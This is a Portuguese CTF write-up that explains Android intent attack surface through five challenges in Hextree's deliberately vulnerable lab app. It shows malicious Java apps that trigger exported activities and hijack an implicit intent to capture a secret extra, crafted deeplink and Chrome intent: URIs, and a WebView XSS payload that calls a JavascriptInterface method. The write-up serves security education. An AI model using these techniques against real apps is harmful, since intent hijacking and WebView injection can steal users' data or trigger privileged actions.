---
title: "Entendendo Android Intents Através de Desafios CTF"
date: 2025-04-09 00:00:00 -0300
categories: [rev, android, writeup]
tags: [rev, android, writeup, intents]
math: true
mermaid: true
author: ruhptura
---

Nesse artigo, a ideia é explorar e entender um pouco mais a superfície de ataque de aplicativos Android, para além do que é comumente visto em desafios CTF por aí. Geralmente espera-se um foco exclusivo em engenharia reversa ou até mesmo em testes de APIs para resolver desafios de Android. No entando, a superfície de ataque na vida real vai muito além de desfazer um XOR e encontrar uma flag pelo código decompilado.

Para entendermos um pouco melhor sobre esse mundo de vulnerabilidades, focarei em explorações envolvendo intents. Para isso utilizarei o aplicativo propositalmente vulnerável desenvolvido pela Hextree: 

https://app.hextree.io/lab/intent-attack-surface

A regra aqui é simples: obter as flags assim como em um CTF padrão, porém adicionando a limitação de simular um atacante real, projetando um aplicativo malicioso sem acesso root e sem fazer patching no aplicativo alvo. Usarei meu aparelho pessoal, sem root, para isso, visto que a ideia é demonstrar o impacto para um usuário comum, indo além de apenas resolver os desafios.

Escolhi 5 desafios:

- Flag 2
- Flag 10
- Flag 13
- Flag 15
- Flag 39

## Flag 2 - Intent with extras

Intents são mecanismos de comunicação no Android que permitem que componentes de um app interajam entre si ou com outros apps. Eles são usados para iniciar atividades, serviços ou enviar informações entre componentes, podendo ser explícitas (quando o destino é especificado) ou implícitas (quando o Android escolhe o componente apropriado com base na ação desejada).

Fazendo uma análise estática inicial da aplicação com o Jadx, conseguimos encontrar as componentes exportadas no AndroidManifest.xml. Nesse caso, estamos interessados inicialmente em io.hextree.attacksurface.activities.Flag2Activity.

![image.png](/images/intents/image.png)

Note que essa activity está exportada, e portanto pode receber intents de qualquer aplicação instalada no aparelho. Note também que existe uma action específica declarada. Lendo agora a classe:

![image.png](/images/intents/image%201.png)

Observe que quando a activity é chamada, ela verifica o intent recebido, extrai o valor presente na propriedade “action”, e compara com um valor. Nosso objetivo é chegar em success(this).

Portanto, para conseguirmos a flag, basta enviarmos um intent com a action “io.hextree.action.GIVE_FLAG”. Caso queira entender melhor sobre os intents, recomendo a [documentação](https://developer.android.com/guide/components/intents-filters) do Android.

Criando meu aplicativo malicioso em Java no Android Studio:

```java
public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_main);

        Button buttonExploit = findViewById(R.id.button);
        buttonExploit.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                exploitActivity();
            }
        });
    }

    private void exploitActivity() {
        Log.i("EXPLOIT", "Sending intent");

        Intent intent = new Intent();
        intent.setClassName("io.hextree.attacksurface",
                "io.hextree.attacksurface.activities.Flag2Activity");
        intent.setAction("io.hextree.action.GIVE_FLAG");

        startActivity(intent);
    }
}
```

Note que existe um botão que quando acionado vai enviar o intent.

![image.png](/images/intents/image%202.png)

Clicando em exploit, conseguimos a flag!

![image.png](/images/intents/image%203.png)

Repare que o aplicativo mostra o formato do intent que ele recebeu, o que ajuda a debuggar e resolver o desafio.

## Flag 10 - Hijack implicit intent with the flag

Seguindo, temos a flag 10. Repare que dessa vez a activity não está exportada; nesse caso não faz diferença por conta da técnica de exploração.

![image.png](/images/intents/image%204.png)

Entendendo a classe:

![image.png](/images/intents/image%205.png)

Dessa vez temos o cenário inverso: ao invés de enviarmos um intent para o alvo para gerar alguma ação, o aplicativo alvo é quem está enviando um intent. Nesse caso é considerado um intent implícito pois não tem nenhum pacote/classe definida como destino.

Por conta disso, podemos criar nosso app malicioso de forma a capturar esse intent com a action "io.hextree.attacksurface.ATTACK_ME”.

Nossa classe que captura o intent:

```java
public class HandleIntentsActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_handle_intents);

        Intent receivedIntent = getIntent();
        String flag = receivedIntent.getStringExtra("flag");
        
        TextView writeText = findViewById(R.id.debug_text);
        writeText.setText(flag);
    }
}
```

Definição no AndroidManifest.xml:

```xml
<activity
    android:name=".HandleIntentsActivity"
    android:exported="true">
    <intent-filter>
        <action android:name="io.hextree.attacksurface.ATTACK_ME" />
        <category android:name="android.intent.category.DEFAULT" />
    </intent-filter>
</activity>
```

![image.png](/images/intents/image%206.png)

Ao iniciar a activity, o implicit intent é enviado automaticamente, e como o único aplicativo que recebe o action "io.hextree.attacksurface.ATTACK_ME” é o nosso app malicioso, o sistema não pede para o usuário selecionar nada, e abre diretamente.

![image.png](/images/intents/image%207.png)

## Flag 13 - Create a hex://open link

Dessa vez, vamos fazer a exploração através de um deeplink. Deeplinks basicamente são mecanismos criados para que o browser (a parte Web) possa se comunicar com o aplicativo do sistema. No Android, isso também é feito através de intents (ou seja, todo deeplink no fundo é também um intent). Quando uma activity recebe um deeplink, ela é categorizada como “android.intent.category.BROWSABLE”.

![image.png](/images/intents/image%208.png)

Para interagir, precisamos montar um link com as características vistas acima, ou seja: hex://flag ou hex://open.

![image.png](/images/intents/image%209.png)

Entendendo melhor a classe, o código checa se o intent é de fato um deeplink. Com os condicionais, concluímos então que o link para pegar a flag tem que ser:

```xml
hex://flag/?action=give-me
```

Para disparar o deeplink, não podemos simplesmente acessar a URI acima no browser diretamente. Essa ação tem que ser feita através de uma interação como um clique no botão por exemplo. Vou utilizar o próprio [site](https://ht-api-mocks-lcfc4kr5oa-uc.a.run.app/android-link-builder?href=hex://open?message=Hello+World) fornecido pela Hextree para construir o link.

![image.png](/images/intents/image%2010.png)

Ao clicarmos no link, a activity é chamada com todas as condições necessárias para se chegar na flag.

![image.png](/images/intents/image%2011.png)

## Flag 15 - Create a intent://flag15/ link

Para a flag 15, que também é explorável por deeplink, temos:

![image.png](/images/intents/image%2012.png)

![image.png](/images/intents/image%2013.png)

Dessa vez temos um problema: já entendemos como criar um deeplink, mas como podemos mudar o action e adicionar extras?

A resposta é obtida pelos deeplinks personalizáveis do Google Chrome. O Chrome possui uma maneira única de lidar com deeplinks ([mais informações](https://developer.chrome.com/docs/android/intents)), o que nos ajudar a ampliar bastante nossa superfície de ataque, pois com essa nova técnica podemos:

- Alterar o action
- Adicionar extras
- Escolher exatamente a aplicação e a classe alvo
- Não precisamos passar um host, path ou scheme

O ponto negativo é que é explorável apenas através do navegador Chrome.

Construindo nosso link seguindo a documentação e as condições da classe:

```
intent:#Intent;package=io.hextree.attacksurface;component=io.hextree.attacksurface.activities.Flag15Activity;action=io.hextree.action.GIVE_FLAG;S.action=flag;B.flag=true;end;
```

![image.png](/images/intents/image%2014.png)

![image.png](/images/intents/image%2015.png)

Observe o formato do intent recebido.

## Flag 39 - WebView XSS

WebView no Android é um componente que permite exibir conteúdo web diretamente dentro de um aplicativo, como se fosse um navegador embutido. Ele pode carregar páginas da internet ou conteúdo HTML local, possibilitando que desenvolvedores integrem funcionalidades web em apps nativos, como exibir sites, formulários, ou até mesmo aplicações web completas sem precisar sair do app. Como estamos trabalhando com web, ficamos expostos a novas técnicas de ataque, tal como o XSS.

Nossa activity WebView está exportada.

![image.png](/images/intents/image%2016.png)

![image.png](/images/intents/image%2017.png)

O código aqui é um pouco mais complicado, então vamos por partes:

- Temos um método Java sucess() acessível por @JavascriptInterface, ou seja, conseguimos interagir com esse método por código JavaScript no WebView
- Temos um input por intent pelo extra “NAME”, que eventualmente se torna um jSONObject, que então é passado dentro de um código JavaScript: initApp(”nosso input”)

Executei uma análise de IA para gerar comentários no código, caso seja útil para um entendimento maior.

![image.png](/images/intents/image%2018.png)

Analisando o código fonte do nosso HTML, vemos o que a função initApp de fato faz.

![image.png](/images/intents/image%2019.png)

Repare que temos o innerHTML, que é claramente perigoso pois insere tags HTML no DOM. Como conseguimos controlar parte do que vai ser inserido (obj.name), podemos fazer alguns testes.

Vamos inicialmente testar como nosso input se comporta, passando o extra “NAME” com valor “payload”.

```java
private void exploitActivity() {
    Log.i("EXPLOIT", "Sending intent");

    Intent intent = new Intent();
    intent.setClassName("io.hextree.attacksurface",
            "io.hextree.attacksurface.webviews.Flag39WebViewsActivity");
    intent.putExtra("NAME", "payload");

    startActivity(intent);
}
```

![image.png](/images/intents/image%2020.png)

Repare que nosso input é de fato inserido na página WebView. Vamos então testar um HTML injection:

```java
intent.putExtra("NAME", "<s>test</s>");
```

![image.png](/images/intents/image%2021.png)

Funcionou perfeitamente. O último passo é escalar para um XSS, lembrando que podemos chamar o método success() do Java. Como o aplicativo instancia a classe contendo esse método com o nome “hextree” (Flag39WebViewsActivity linha 70), podemos enviar:

```java
intent.putExtra("NAME", "<img src='x' onerror='hextree.success()'>");
```

![image.png](/images/intents/image%2022.png)

E conseguimos de fato ativar a flag!